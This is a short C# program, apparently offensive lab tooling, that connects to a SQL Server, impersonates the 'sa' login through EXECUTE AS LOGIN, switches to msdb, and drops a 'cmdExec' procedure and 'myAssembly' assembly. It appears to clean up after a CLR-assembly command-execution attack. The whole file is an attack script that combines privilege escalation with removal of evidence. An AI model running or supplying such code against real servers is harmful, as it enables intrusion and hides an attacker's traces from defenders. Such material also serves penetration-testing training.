using System;

using System.Data.SqlClient;

namespace cleanup
{
    class Program
    {
        static void Main(string[] args)
        {
            String sqlServer = "cdc01.prod.corp1.com";
            String database = "master";

            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("Auth success");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }

            String impersonate_user = "EXECUTE AS LOGIN = 'sa';";
            String switchdb = "use msdb;";
            String drop = "DROP PROCEDURE cmdExec; DROP ASSEMBLY myAssembly;";

            SqlCommand command = new SqlCommand(impersonate_user, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(switchdb, con);
            reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(drop, con);
            reader = command.ExecuteReader();
            reader.Close();

            con.Close();
        }
    }
}
